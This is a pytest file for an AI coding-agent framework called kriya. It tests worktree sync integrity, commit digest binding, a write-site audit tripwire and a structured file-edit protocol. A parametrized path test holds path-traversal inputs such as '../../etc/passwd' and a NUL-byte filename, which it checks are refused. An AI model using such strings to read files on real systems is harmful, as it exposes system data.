def test_issue12_sync_noop_roundtrip_is_byte_identical_for_the_corpus(repo):
    from kriya.workflow.worktree import create_git_worktree

    (repo / "seed").write_text("s\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "init")
    for name, data in CORPUS.items():
        _write(repo, name, data)
    worktree = Path(create_git_worktree(str(repo)))
    for name, data in CORPUS.items():
        assert (worktree / name).read_bytes() == data, name


def test_issue12_sync_preserves_symlinks_and_modes(repo):
    from kriya.workflow.worktree import create_git_worktree

    (repo / "tool.sh").write_text("#!/bin/sh\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "init")
    os.chmod(repo / "tool.sh", 0o755)
    (repo / "tool.sh").write_text("#!/bin/sh\necho 2\n")
    os.symlink("tool.sh", repo / "link.sh")
    worktree = Path(create_git_worktree(str(repo)))
    assert os.readlink(worktree / "link.sh") == "tool.sh"
    assert os.stat(worktree / "tool.sh").st_mode & 0o777 == 0o755


def test_issue12_sync_failure_fails_closed(repo):
    from kriya.workflow import worktree as worktree_module

    (repo / "a.txt").write_text("1\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "init")
    (repo / "a.txt").write_text("2\n")
    with patch.object(worktree_module.shutil, "copy2", side_effect=OSError("disk full")):
        with pytest.raises(worktree_module.WorktreeSyncError) as raised:
            worktree_module.create_git_worktree(str(repo))
    assert raised.value.reason_code == WORKTREE_SYNC_FAILED


def test_issue12_sync_content_mismatch_fails_closed(repo):
    from kriya.workflow import worktree as worktree_module

    (repo / "a.txt").write_text("1\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "init")
    (repo / "a.txt").write_text("2\n")

    def wrong_copy(src, dst, follow_symlinks=True):
        Path(dst).write_bytes(b"stale\n")

    with patch.object(worktree_module.shutil, "copy2", side_effect=wrong_copy):
        with pytest.raises(worktree_module.WorktreeSyncError) as raised:
            worktree_module.create_git_worktree(str(repo))
    assert raised.value.reason_code == WORKTREE_CONTENT_MISMATCH


def test_issue12_status_parser_refuses_unparseable_records(repo):
    from kriya.workflow import worktree as worktree_module

    with patch.object(worktree_module.subprocess, "run", return_value=subprocess.CompletedProcess(
            [], 0, stdout=b"R  new\0", stderr=b"")):
        with pytest.raises(RuntimeError):
            worktree_module.git_status_entries(str(repo))


# ---------------------------------------------------------------- #11 / §13 / §29 / §30 digest chain


def test_verified_bytes_equal_committed_bytes_or_the_commit_is_uncertain(tmp_path):
    from _fake_static_analysis import DISABLED_STATIC_ANALYSIS

    from kriya.workflow import terminal_commit
    from kriya.workflow.terminal_commit import (
        VERIFIED_COMMIT_DIGEST_MISMATCH,
        CandidateFile,
        commit_terminal_candidate,
        materialize_candidate,
    )
    from kriya.workflow.verification_binding import bind_candidate

    workspace, candidate = tmp_path / "ws", tmp_path / "cand"
    _write(workspace, "a.py", b"a\r\n")
    _write(candidate, "a.py", b"b\r\n")
    writes = materialize_candidate(str(candidate), str(workspace), [
        CandidateFile("a.py", read_file_revision(str(workspace / "a.py")))])
    binding = bind_candidate(writes, str(workspace))
    real_batch = terminal_commit.commit_revision_grounded_batch

    def tampering_batch(batch, **kwargs):
        result = real_batch(batch, **kwargs)
        (workspace / "a.py").write_bytes(b"b\n")  # a rewrite after the bytes landed
        return result

    with patch.object(terminal_commit, "commit_revision_grounded_batch", tampering_batch):
        outcome = commit_terminal_candidate(writes, workspace_path=str(workspace), transaction_id="t1",
                                            static_analysis=DISABLED_STATIC_ANALYSIS, verified_candidate=binding)
    assert not outcome.committed and outcome.reason_code == VERIFIED_COMMIT_DIGEST_MISMATCH
    assert outcome.workspace_state == "UNCERTAIN"


def test_a_candidate_changed_after_verification_is_refused(tmp_path):
    from _fake_static_analysis import DISABLED_STATIC_ANALYSIS

    from kriya.workflow.terminal_commit import CandidateFile, commit_terminal_candidate, materialize_candidate
    from kriya.workflow.verification_binding import VERIFIED_CANDIDATE_EVIDENCE_STALE, bind_candidate

    workspace, candidate = tmp_path / "ws", tmp_path / "cand"
    _write(workspace, "a.py", b"a\n")
    _write(candidate, "a.py", b"b\n")
    files = [CandidateFile("a.py", read_file_revision(str(workspace / "a.py")))]
    binding = bind_candidate(materialize_candidate(str(candidate), str(workspace), files), str(workspace))
    (candidate / "a.py").write_bytes(b"b\r\n")  # post-verification mutation
    outcome = commit_terminal_candidate(
        materialize_candidate(str(candidate), str(workspace), files), workspace_path=str(workspace),
        transaction_id="t2", static_analysis=DISABLED_STATIC_ANALYSIS, verified_candidate=binding)
    assert not outcome.committed and outcome.reason_code == VERIFIED_CANDIDATE_EVIDENCE_STALE
    assert (workspace / "a.py").read_bytes() == b"a\n"


def test_a_candidate_symlink_is_never_materialized_as_a_file(tmp_path):
    from kriya.workflow.terminal_commit import CandidateFile, CandidateMaterializationError, materialize_candidate

    workspace, candidate = tmp_path / "ws", tmp_path / "cand"
    workspace.mkdir()
    _write(candidate, "real.py", b"x\n")
    os.symlink("real.py", candidate / "link.py")
    with pytest.raises(CandidateMaterializationError):
        materialize_candidate(str(candidate), str(workspace), [CandidateFile("link.py", raw_digest(b""))])


def _attempt_state_ctx(tmp_path):
    from types import SimpleNamespace

    from kriya.workflow.state import GenerationState

    state = GenerationState()
    ctx = SimpleNamespace(worktree_path=str(tmp_path / "wt"), workspace_path=str(tmp_path / "ws"))
    return state, ctx


def test_worktree_bytes_must_equal_the_staged_candidate_before_verification(tmp_path):
    from kriya.workflow.attempt import _require_worktree_matches_candidate
    from kriya.workflow.failure import QualityGateFailure

    state, ctx = _attempt_state_ctx(tmp_path)
    path = _write(Path(ctx.worktree_path), "a.py", b"staged\n")
    state.candidate_digests["a.py"] = raw_digest(b"staged\n")
    state.candidate_digests["gone.py"] = None
    _require_worktree_matches_candidate(state, ctx)  # matches: no error
    path.write_bytes(b"rewritten behind the writer\n")
    with pytest.raises(QualityGateFailure) as raised:
        _require_worktree_matches_candidate(state, ctx)
    assert raised.value.failure.diagnostics["reason_code"] == WORKTREE_CONTENT_MISMATCH
    assert raised.value.failure.type == "internal_framework_error"  # a deterministic stop
    assert state.gate_outcomes and state.gate_outcomes[-1]["type"] == "internal_framework_error"


def test_issue11_a_repository_pom_is_never_rewritten_behind_the_gates(tmp_path):
    """Real engine, mocked model: the pre-contract run verified a widened
    pom.xml the commit did not carry. The repository's own pom is now never
    corrected; the gate verifies exactly the bytes that are committed."""
    import asyncio

    from _milestone_proof_harness import _config, _engine

    from kriya.tools.validate import PolymorphicValidator

    ws = tmp_path / "ws"
    ws.mkdir()
    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
        _git(ws, *args)
    pom = b'<project xmlns="http://maven.apache.org/POM/4.0.0">\n  <modelVersion>4.0.0</modelVersion>\n</project>\n'
    (ws / "pom.xml").write_bytes(pom)
    _git(ws, "add", "-A")
    _git(ws, "commit", "-qm", "s")
    seen = {}

    def compile_check(self, files=None, *args, **kwargs):
        seen["pom"] = (Path(self.workspace_path) / "pom.xml").read_bytes()
        return {"success": True, "output": "ok"}

    engine, _llm = _engine(_config(), [
        "Step 1: add App", "Design: Write app/App.java",
        '<<<KRIYA:FILE path="app/App.java">>>\npublic class App { public static void main(String[] a) {} }\n'
        '<<<KRIYA:END_FILE>>>\n',
        "Review: Approved",
    ])
    with patch.object(PolymorphicValidator, "run_compile_check", compile_check), \
            patch.object(PolymorphicValidator, "run_tests", lambda self, *a, **k: {"success": True, "output": "ok"}):
        asyncio.run(engine.run_generation_workflow("Add app/App.java", str(ws)))
    assert seen["pom"] == pom == (ws / "pom.xml").read_bytes()


def test_issue11_a_candidate_pom_correction_is_a_visible_staged_candidate_write(tmp_path):
    from types import SimpleNamespace

    from kriya.policy.filesystem import WriteScopeMode
    from kriya.workflow.attempt import _apply_candidate_pom_corrections
    from kriya.workflow.state import GenerationState

    wt = tmp_path / "wt"
    pom = _write(wt, "pom.xml", b"<project>\r\n  <modelVersion>4.0.0</modelVersion>\r\n</project>\r\n")
    _write(wt, "app/App.java", b"public class App {}\n")
    state = GenerationState()
    ctx = SimpleNamespace(
        worktree_path=str(wt), workspace_path=str(wt), protected_relpath=None, allowed_write_relpaths=(),
        write_scope_mode=WriteScopeMode.UNRESTRICTED, established_files=[],
        kernel=SimpleNamespace(config=SimpleNamespace(paths=SimpleNamespace(
            skills=str(wt / "skills"), memory=str(tmp_path / "memory")))),
    )
    before = pom.read_bytes()
    _apply_candidate_pom_corrections(state, ctx, ["app/App.java"])
    assert pom.read_bytes() == before  # not the candidate's pom: never touched
    state.all_files_written.add("pom.xml")
    _apply_candidate_pom_corrections(state, ctx, ["app/App.java"])
    after = pom.read_bytes()
    assert after != before and b"\r\n" in after and b"\n" not in after.replace(b"\r\n", b"")
    [event] = [e for e in state.run_events if e.kind == "candidate.deterministic_transformation"]
    assert event.details["before_sha256"] == raw_digest(before)
    assert event.details["after_sha256"] == raw_digest(after) == state.candidate_digests["pom.xml"]


# ---------------------------------------------------------------- §31 direct-write tripwire

# Every filesystem-mutation site in kriya/ and plugins/, classified in
# handover/FILE_INTEGRITY_CONTRACT_001.md ("direct-write audit"). A new site
# fails here until it is classified there and counted here - a target-repo
# source write outside the staged writer must never appear silently again.
_WRITE_RE = re.compile(
    r"\.write_text\(|\.write_bytes\(|open\([^)]*[\"'](w|a|wb|ab|w\+|r\+|x|xb)[\"']|os\.fdopen\([^)]*[\"'](w|wb|a)"
    r"|shutil\.(copy|copy2|copyfile|copytree|move|rmtree)\(|os\.(replace|rename|unlink|remove|rmdir|symlink|truncate)\("
)
_AUDITED_WRITE_SITES = {
    "kriya/cli.py": 7, "kriya/config/authority_approval.py": 4, "kriya/control/persistence.py": 1,
    "kriya/control/recovery.py": 3, "kriya/control/retention.py": 1, "kriya/core/model_certification.py": 4,
    "kriya/core/model_qualification.py": 3, "kriya/core/model_routing.py": 2, "kriya/core/model_runtime.py": 2,

    "kriya/core/attempt_evidence/retention.py": 3, "kriya/core/attempt_evidence/writer.py": 2, "kriya/core/state_paths.py": 2, "kriya/knowledge/staging.py": 4, "kriya/mcp/invocation_approval.py": 2,
    "kriya/memory/memory.py": 2, "kriya/metrics/adjudication.py": 2, "kriya/metrics/report.py": 2,
    "kriya/policy/approved_sources.py": 1, "kriya/production_doctor.py": 4, "kriya/skills/skill.py": 4,
    "kriya/static_analysis/scope.py": 1, "kriya/static_analysis/service.py": 2, "kriya/static_analysis/waivers.py": 2,
    "kriya/tools/containment_oci.py": 0, "kriya/tools/knowledge.py": 1, "kriya/tools/lsp.py": 3,
    "kriya/tools/validate.py": 5, "kriya/workflow/checkpoint.py": 4, "kriya/workflow/context_certification.py": 3,
    "kriya/workflow/deterministic_failure_diagnostic.py": 2, "kriya/workflow/edit_safety.py": 0,
    "kriya/workflow/milestone_completion.py": 1, "kriya/workflow/proposal_store.py": 3,
    "kriya/workflow/regression_attribution.py": 1, "kriya/workflow/resume_fingerprints.py": 2,
    "kriya/workflow/skill_extraction.py": 3, "kriya/workflow/workflow.py": 2, "kriya/workflow/workflow_controller.py": 1,
    "kriya/workflow/worktree.py": 0, "plugins/core_tools/__init__.py": 1,
}
# The writer modules themselves: their sites ARE the staged writer and the
# sandbox manager (counted separately so a change there is still visible).
_WRITER_MODULES = {"kriya/workflow/edit_safety.py", "kriya/workflow/worktree.py", "kriya/workflow/file_integrity.py"}


def _write_site_counts():
    counts = {}
    for base in ("kriya", "plugins"):
        for path in sorted((ROOT / base).rglob("*.py")):
            rel = path.relative_to(ROOT).as_posix()
            hits = sum(1 for line in path.read_text().splitlines()
                       if _WRITE_RE.search(line) and not line.lstrip().startswith("#"))
            if hits:
                counts[rel] = hits
    return counts


def test_every_filesystem_write_site_is_audited():
    counts = {rel: n for rel, n in _write_site_counts().items() if rel not in _WRITER_MODULES}
    unaudited = {rel: n for rel, n in counts.items() if n > _AUDITED_WRITE_SITES.get(rel, 0)}
    assert not unaudited, f"new filesystem write sites - classify them in the FILE-INTEGRITY audit: {unaudited}"


def test_the_attempt_and_toolchain_never_write_files_directly():
    for rel in ("kriya/workflow/attempt.py", "kriya/workflow/toolchain.py", "kriya/workflow/file_resolution.py",
                "kriya/workflow/self_correction.py", "kriya/agents/agent.py"):
        source = (ROOT / rel).read_text()
        assert not _WRITE_RE.search(source), rel


def test_no_lossy_decoding_in_mutation_or_revision_authority():
    for rel in ("kriya/workflow/edit_safety.py", "kriya/workflow/terminal_commit.py",
                "kriya/workflow/self_correction.py", "kriya/workflow/worktree.py", "kriya/agents/response_protocol.py"):
        assert 'errors="replace"' not in (ROOT / rel).read_text(), rel
    tree = ast.parse((ROOT / "kriya/workflow/file_integrity.py").read_text())
    lossy = [node.name for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)
             and 'errors="replace"' in ast.get_source_segment((ROOT / "kriya/workflow/file_integrity.py").read_text(), node)]
    assert lossy == ["display_text"]


def test_no_payload_sanitizer_or_substring_anchor_remains():
    tree = ast.parse((ROOT / "kriya/agents/agent.py").read_text())
    identifiers = {node.name for node in ast.walk(tree) if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))}
    identifiers |= {node.id for node in ast.walk(tree) if isinstance(node, ast.Name)}
    identifiers |= {node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute)}
    for gone in ("sanitize_generated_content", "_fix_xml_comment_double_hyphens", "_GUTTER_HIGHLIGHT_RE",
                 "_GUTTER_CONTEXT_RE", "_NO_CHANGE_NEEDED_RE", "_TRAILING_FILE_CONTENT_RE", "_split_fix_analysis",
                 "_split_fix_analysis_edit", "_repair_protocol_error", "_strip_markdown_fences"):
        assert gone not in identifiers, gone
    engine = (ROOT / "kriya/workflow/file_integrity.py").read_text()
    assert ".splitlines(" not in engine and ".count(search" not in engine


# ================================================================ closure pass (F-1..F-4, S-1, S-2)

_EDIT = '<<<KRIYA:EDIT path="app.properties">>>\n<<<KRIYA:SEARCH>>>\nserver.port=8080\n<<<KRIYA:REPLACE>>>\nserver.port=8081\n<<<KRIYA:END_EDIT>>>\n'
_PROSE = "\nI updated the port so the service no longer clashes with the admin console.\n"


def test_f1_legacy_framing_carries_trailing_prose_into_the_payload():
    """The measured F-1 mechanism (kept as characterization): the legacy
    markers have no terminator, so prose after REPLACE is payload. This is
    why legacy is compatibility-only and never the production protocol."""
    parsed = parse_legacy_repair("FIX ANALYSIS: port\nSEARCH:\nserver.port=8080\nREPLACE:\nserver.port=8081\n" + _PROSE,
                                 "app.properties", patch_allowed=True)
    assert parsed.kind == EDITS and "no longer clashes" in parsed.edits[0][1]


@pytest.mark.parametrize("response", [
    _EDIT + _PROSE,
    '<<<KRIYA:FILE path="app.properties">>>\nserver.port=8081\n<<<KRIYA:END_FILE>>>\n' + _PROSE,
    '<<<KRIYA:FILE path="cfg.yaml">>>\nport: 8081\n<<<KRIYA:END_FILE>>>\n' + "Note: also check the proxy.\n",
    _EDIT + "<<<KRIYA:END_EDIT>>>\n",
])
def test_f1_text_after_the_last_structured_block_is_refused_and_never_written(response):
    target = "cfg.yaml" if "cfg.yaml" in response else "app.properties"
    parsed = parse_structured(response, target)
    assert parsed.kind == INVALID and parsed.reason_code == INVALID_EDIT_PROTOCOL
    assert parsed.content is None and parsed.edits == ()


@pytest.mark.developer_answers_verbatim
def test_f1_the_production_developer_refuses_trailing_prose_end_to_end():
    import asyncio
    from unittest.mock import AsyncMock

    from kriya.core import LLMClient
    from kriya.workflow.operations import CodeOperation

    cfg = AppConfig()  # the production default protocol
    llm = LLMClient(cfg)
    llm.complete = AsyncMock(return_value=('Change the port.\n<<<KRIYA:FILE path="app.properties">>>\n'
                                           'server.port=8081\n<<<KRIYA:END_FILE>>>\n' + _PROSE))
    files = asyncio.run(DeveloperAgent("developer", llm).run_generation(
        "Task", "Design", "server.port=8080\n", known_target_files=["app.properties"],
        prior_error_context="port clash", files_with_current_content={"app.properties"},
        operation_by_file={"app.properties": CodeOperation.REPAIR_WITH_PATCH}))
    assert files[0]["protocol_reason_code"] == INVALID_EDIT_PROTOCOL
    assert files[0]["content"] is None and not files[0].get("edits")
    system = llm.complete.call_args.args[0]
    assert '<<<KRIYA:FILE path="app.properties">>>' in system and "FILE CONTENT:" not in system


def test_f2_structured_file_newline_grammar_is_explicit():
    with_newline = parse_structured('<<<KRIYA:FILE path="a.py">>>\nx = 1\n<<<KRIYA:END_FILE>>>\n', "a.py")
    assert with_newline.content == "x = 1\n" and with_newline.final_newline is True
    without = parse_structured('<<<KRIYA:FILE path="a.py">>>\nx = 1\n<<<KRIYA:END_FILE no_final_newline>>>\n', "a.py")
    assert without.content == "x = 1" and without.final_newline is False
    empty = parse_structured('<<<KRIYA:FILE path="a.py">>>\n<<<KRIYA:END_FILE>>>\n', "a.py")
    assert empty.content == ""
    blank_tail = parse_structured('<<<KRIYA:FILE path="a.py">>>\nx\n\n<<<KRIYA:END_FILE>>>\n', "a.py")
    assert blank_tail.content == "x\n\n"


def test_f2_new_and_existing_file_final_newline_state(tmp_path):
    new = load_snapshot(str(tmp_path / "new.py"))
    parsed = parse_structured('<<<KRIYA:FILE path="new.py">>>\nx = 1\n<<<KRIYA:END_FILE no_final_newline>>>\n', "new.py")
    assert new.encode(keep_final_newline_state(new, parsed.content)) == b"x = 1"
    parsed = parse_structured('<<<KRIYA:FILE path="new.py">>>\nx = 1\n<<<KRIYA:END_FILE>>>\n', "new.py")
    assert new.encode(keep_final_newline_state(new, parsed.content)) == b"x = 1\n"
    # Existing File Convention Policy: the file's own state wins.
    none = load_snapshot(str(_write(tmp_path, "none.py", b"old")))
    assert none.encode(keep_final_newline_state(none, parsed.content)) == b"x = 1"
    crlf = load_snapshot(str(_write(tmp_path, "crlf.py", b"a\r\nb\r\n")))
    parsed = parse_structured('<<<KRIYA:FILE path="crlf.py">>>\na\nc\n<<<KRIYA:END_FILE>>>\n', "crlf.py")
    assert crlf.encode(keep_final_newline_state(crlf, parsed.content)) == b"a\r\nc\r\n"
    bom = load_snapshot(str(_write(tmp_path, "bom.py", b"\xef\xbb\xbfa\n")))
    assert bom.encode(keep_final_newline_state(bom, "b\n")) == b"\xef\xbb\xbfb\n"


@pytest.mark.parametrize(("path", "expected"), [
    ("./a.py", "a.py"), ("src//pkg///a.py", "src/pkg/a.py"), ("src/./a.py", "src/a.py"),
    ("src/x/../a.py", "src/a.py"), ("a.py", "a.py"),
])
def test_s2_protocol_paths_normalize_to_the_repository_relative_target(path, expected):
    from kriya.agents.response_protocol import normalize_protocol_path

    assert normalize_protocol_path(path) == expected
    parsed = parse_structured(f'<<<KRIYA:FILE path="{path}">>>\nx\n<<<KRIYA:END_FILE>>>\n', expected)
    assert parsed.kind == FILE and parsed.content == "x\n"


@pytest.mark.parametrize("path", ["../../etc/passwd", "../a.py", "/etc/passwd", "a/../../b.py", "C:/x.py",
                                  "a\\b.py", ".", "..", "a\x00b.py"])
def test_s2_escaping_absolute_or_malformed_protocol_paths_are_refused(path):
    from kriya.agents.response_protocol import normalize_protocol_path

    assert normalize_protocol_path(path) is None
    parsed = parse_structured(f'<<<KRIYA:FILE path="{path}">>>\nx\n<<<KRIYA:END_FILE>>>\n', "a.py")
    assert parsed.kind == INVALID and parsed.reason_code == INVALID_EDIT_PROTOCOL


def test_s2_a_normalized_path_naming_another_file_is_refused():
    parsed = parse_structured('<<<KRIYA:FILE path="./b.py">>>\nx\n<<<KRIYA:END_FILE>>>\n', "a.py")
    assert parsed.kind == INVALID and "expected 'a.py'" in parsed.detail


@pytest.mark.parametrize(("target", "payload"), [
    ("pkg/mod.py", '"""Usage:\n\n```python\nimport mod\n```\n"""\n\ndef run():\n    return 1\n'),
    ("README.md", "# T\n\n```bash\nrun\n```\n\n```\nplain\n```\n"),
    ("src/A.java", 'class A {\n    // ```java example\n    String s = "```";\n}\n'),
])
def test_structured_payload_carries_fence_like_content_verbatim(target, payload):
    parsed = parse_structured(f'Why.\n<<<KRIYA:FILE path="{target}">>>\n{payload}<<<KRIYA:END_FILE>>>\n', target)
    assert parsed.kind == FILE and parsed.content == payload


def test_s1_search_edge_blank_lines_are_part_of_the_anchor_until_measured():
    """S-1 is decided by measured evidence (handover); until then a blank
    SEARCH edge line is an anchor line, and REPLACE edges are always exact."""
    parsed = parse_structured('<<<KRIYA:EDIT path="a.py">>>\n<<<KRIYA:SEARCH>>>\n\nx = 1\n<<<KRIYA:REPLACE>>>\n\nx = 2\n\n'
                              '<<<KRIYA:END_EDIT>>>\n', "a.py")
    assert parsed.edits == (("\nx = 1", "\nx = 2\n"),)


def test_no_automatic_fallback_between_protocols():
    """One invocation, one protocol: a legacy answer under the structured
    protocol is refused, never re-read as legacy (and vice versa)."""
    legacy = "FIX ANALYSIS: x\nSEARCH:\na\nREPLACE:\nb\n"
    assert parse_structured(legacy, "a.py").reason_code == MODEL_EDIT_PROTOCOL_INVALID
    structured = '<<<KRIYA:EDIT path="a.py">>>\n<<<KRIYA:SEARCH>>>\na\n<<<KRIYA:REPLACE>>>\nb\n<<<KRIYA:END_EDIT>>>\n'
    assert parse_legacy_repair(structured, "a.py", patch_allowed=True).kind == INVALID
    agent_source = (ROOT / "kriya/agents/agent.py").read_text()
    call = agent_source[agent_source.index("protocol = developer_response_protocol(self.llm.config)"):]
    call = call[:call.index("analysis = parsed.analysis")]
    assert call.count("parse_structured(") == 1 and "elif" in call  # exactly one parser per invocation


def test_qualification_binds_the_response_protocol_and_v6_records_are_stale():
    from kriya.core import model_qualification as mq

    # The protocol binding exists from /7 on (a later bump keeps it).
    assert int(mq.QUALIFICATION_POLICY_VERSION.rsplit("/", 1)[1]) >= 7
    structured, legacy = AppConfig(), AppConfig()
    legacy.autonomy.developer_response_protocol = "legacy_strict"
    assert mq.policy_digest_for(structured) != mq.policy_digest_for(legacy)
    record = mq.build_record(_qual_fp(), [mq.CaseResult("plain_completion", mq.PASS)], settings=_qual_settings(),
                             response_protocol="kriya_sentinel_v1")
    assert record["developer_response_protocol"] == "kriya_sentinel_v1"
    ok = mq.assess(_qual_fp(), ("plain_completion",), settings=_qual_settings(), record=record,
                   policy_digest=mq.policy_digest_for(structured))
    other = mq.assess(_qual_fp(), ("plain_completion",), settings=_qual_settings(), record=record,
                      policy_digest=mq.policy_digest_for(legacy))
    assert ok.status == mq.QUALIFIED and other.status == mq.STALE
    v6 = dict(record, policy_version="kriya-qualification/6")
    assert mq.assess(_qual_fp(), ("plain_completion",), settings=_qual_settings(), record=v6,
                     policy_digest=mq.policy_digest_for(structured)).status == mq.STALE


def _qual_fp():
    from test_prd014_model_qualification import _fp

    return _fp()


def _qual_settings():
    from kriya.core.inference_settings import InferenceSettings

    return InferenceSettings(temperature=0.7, reasoning=False)


@pytest.mark.parametrize(("protocol", "status"), [("structured", "PASS"), ("legacy_strict", "FAIL")])
def test_doctor_requires_the_structured_protocol(protocol, status):
    from types import SimpleNamespace

    from kriya.production_doctor import _check_response_protocol

    cfg = AppConfig()
    cfg.autonomy.developer_response_protocol = protocol
    check = _check_response_protocol(SimpleNamespace(cfg=cfg))
    assert check.status.value == status and check.required is True
    assert check.evidence["identity"] == ("kriya_sentinel_v1" if protocol == "structured" else "strict_legacy_v1")


def test_production_runs_refuse_the_legacy_protocol():
    source = (ROOT / "kriya/cli.py").read_text()
    guard = source[source.index('if cfg.runtime_profile == "production" and developer_response_protocol(cfg)'):]
    assert "RESPONSE_PROTOCOL_NOT_PRODUCTION" in guard[:600] and "sys.exit(1)" in guard[:600]


def _slug_block(payload, end="<<<KRIYA:END_FILE>>>"):
    body = payload[:-1] if payload.endswith("\n") else payload
    return f'<<<KRIYA:FILE path="slug.py">>>\n{body}\n{end}\n'


_V7_SOURCE = __import__("kriya.core.model_qualification", fromlist=["FULL_FILE_SOURCE"]).FULL_FILE_SOURCE
_EDIT_OK = ('Skip negatives.\n<<<KRIYA:EDIT path="./src/calc.py">>>\n<<<KRIYA:SEARCH>>>\n        result += p\n'
            "<<<KRIYA:REPLACE>>>\n        if p >= 0:\n            result += p\n<<<KRIYA:END_EDIT>>>\n")


@pytest.mark.parametrize(("case", "answer", "passes"), [
    ("full", _slug_block(_V7_SOURCE), True),                                               # supplied file, exact
    ("full", "Sure!\n" + _slug_block(_V7_SOURCE), True),                                  # prose BEFORE is grammar
    ("full", _slug_block(_V7_SOURCE.replace("    ```python\n", "").replace("    ```\n", "")), False),  # fence dropped
    ("full", _slug_block(_V7_SOURCE.replace("hello-world", "hello_world")), False),       # one byte changed
    ("full", _slug_block(_V7_SOURCE) + "Hope this helps!\n", False),                     # trailing prose
    ("full", _slug_block(_V7_SOURCE, "<<<KRIYA:END_FILE no_final_newline>>>"), False),     # wrong final newline
    ("full", _V7_SOURCE, False),                                                          # protocol bypassed
    ("edit", _EDIT_OK, True),
    ("edit", _EDIT_OK.replace("./src/calc.py", "../src/calc.py"), False),                # path escape
    ("edit", _EDIT_OK + "done\n", False),                                                # trailing prose
])
def test_v7_protocol_cases_judge_the_structured_protocol(case, answer, passes):
    import asyncio

    from kriya.core import model_qualification as mq
    from kriya.core.completion import CompletionResult, CompletionStatus

    class OneAnswer:
        def __init__(self):
            self.calls = []

        async def complete_result(self, system, prompt, **kwargs):
            self.calls.append((system, prompt))
            return CompletionResult(content=answer, status=CompletionStatus.OK, finish_reason="stop")

    llm = OneAnswer()
    fn = mq.case_full_file_raw_content if case == "full" else mq.case_anchored_edit_protocol
    result = asyncio.run(fn(llm, "m", {"response_protocol": "structured"}))
    assert (result.status == mq.PASS) is passes, result.evidence
    assert "<<<KRIYA:" in llm.calls[0][0]


@pytest.mark.developer_answers_verbatim
def test_no_fallback_a_legacy_shaped_answer_under_the_structured_protocol_is_refused():
    import asyncio
    from unittest.mock import AsyncMock

    from kriya.core import LLMClient
    from kriya.workflow.operations import CodeOperation

    llm = LLMClient(AppConfig())
    llm.complete = AsyncMock(return_value="FIX ANALYSIS: port\nFILE CONTENT:\nserver.port=8081\n")
    files = asyncio.run(DeveloperAgent("developer", llm).run_generation(
        "Task", "Design", "server.port=8080\n", known_target_files=["app.properties"],
        prior_error_context="port clash", files_with_current_content={"app.properties"},
        operation_by_file={"app.properties": CodeOperation.REPAIR_WITH_FULL_FILE}))
    assert files[0]["protocol_reason_code"] == MODEL_EDIT_PROTOCOL_INVALID and files[0]["content"] is None


# ---------------------------------------------------------------- F-3: typed sync stop in both modes


def _sync_workspace(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
        _git(ws, *args)
    (ws / "a.txt").write_text("v1\n")
    _git(ws, "add", "-A")
    _git(ws, "commit", "-qm", "s")
    (ws / "a.txt").write_text("v2 uncommitted\n")
    return ws


def _sync_sabotage(kind):
    import shutil as real_shutil

    real_copy2 = real_shutil.copy2

    def sabotage(src, dst, follow_symlinks=True):
        if kind == "copy_fails":
            raise OSError("disk full")
        real_copy2(src, dst, follow_symlinks=follow_symlinks)
        if kind == "source_changed_during_sync":
            Path(src).write_text("v3 written during the sync\n")
        else:  # byte mismatch after sync
            Path(dst).write_bytes(b"stale\n")
    return sabotage


@pytest.mark.parametrize(("kind", "code"), [
    ("copy_fails", WORKTREE_SYNC_FAILED),
    ("source_changed_during_sync", WORKTREE_CONTENT_MISMATCH),
    ("byte_mismatch", WORKTREE_CONTENT_MISMATCH),
])
def test_f3_direct_mode_returns_the_typed_sync_stop(tmp_path, kind, code):
    import asyncio

    from _milestone_proof_harness import _config, _engine

    from kriya.workflow import worktree as worktree_module

    ws = _sync_workspace(tmp_path)
    engine, llm = _engine(_config(), ["Step 1: x", "Design: x", "Review: Approved"])
    with patch.object(worktree_module.shutil, "copy2", side_effect=_sync_sabotage(kind)):
        result = asyncio.run(engine.run_generation_workflow("Change a.txt", str(ws)))
    assert result["quality_gates_passed"] is False
    assert result["reason_codes"] == [code] and result["failure_category"] == code.lower()
    assert result["error"].startswith(f"{code}:")
    assert llm.complete.await_count <= 2  # stopped before any Developer call


@pytest.mark.parametrize("code", [WORKTREE_SYNC_FAILED, WORKTREE_CONTENT_MISMATCH])
def test_f3_enforce_mode_reports_the_typed_sync_stop(tmp_path, monkeypatch, code):
    import asyncio

    from test_workflow_controller_enforce import _patched, _workflow_engine

    from kriya.workflow.plan_schema import EngineeringPlan, ExecutionMethod, FileAction, PlannedFile, Subtask
    from kriya.workflow.triage import ChangeKind
    from kriya.workflow.workflow_controller import WorkflowController
    from kriya.workflow.worktree import WorktreeSyncError

    def refuse(workspace):
        raise WorktreeSyncError(code, "the sandbox does not hold the workspace's bytes")

    monkeypatch.setattr("kriya.workflow.workflow_controller.create_git_worktree", refuse)
    plan = EngineeringPlan(plan_id="run1", kind=ChangeKind.TASK, subtasks=[Subtask(
        id="s1", description="edit a", execution_method=ExecutionMethod.MODEL,
        planned_files=[PlannedFile(path="a.txt", action=FileAction.MODIFY)])])
    (tmp_path / "a.txt").write_text("v1\n")
    we = _workflow_engine()
    p1, p2, p3 = _patched(plan)
    with p1, p2, p3:
        result = asyncio.run(WorkflowController(we).execute("edit a", str(tmp_path), migration_mode="enforce"))
    legacy = result.legacy_result
    assert legacy["reason_codes"] == [code] and legacy["failure_type"] == "WORKTREE_SYNC"
    assert legacy["quality_gates_passed"] is False and "STRUCTURED_PLAN_UNAVAILABLE" not in legacy["reason_codes"]


# ---------------------------------------------------------------- F-4: verification tree binding


def _tree(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
        _git(root, *args)
    (root / "src").mkdir()
    (root / "src" / "App.java").write_text("class App {}\n")
    (root / "README.md").write_text("readme\n")
    (root / ".gitignore").write_text("target/\n")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "s")
